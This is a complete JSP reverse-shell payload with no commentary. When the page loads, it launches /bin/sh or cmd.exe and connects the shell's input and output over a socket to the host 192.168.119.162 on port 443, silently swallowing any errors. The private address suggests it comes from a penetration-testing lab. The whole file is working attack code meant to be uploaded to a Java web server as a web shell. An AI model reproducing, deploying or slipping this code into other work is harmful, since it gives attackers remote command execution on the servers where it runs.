<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ii;
    OutputStream ih;

    StreamConnector( InputStream ii, OutputStream ih )
    {
      this.ii = ii;
      this.ih = ih;
    }

    public void run()
    {
      BufferedReader dp  = null;
      BufferedWriter xmv = null;
      try
      {
        dp  = new BufferedReader( new InputStreamReader( this.ii ) );
        xmv = new BufferedWriter( new OutputStreamWriter( this.ih ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dp.read( buffer, 0, buffer.length ) ) > 0 )
        {
          xmv.write( buffer, 0, length );
          xmv.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dp != null )
          dp.close();
        if( xmv != null )
          xmv.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.162", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
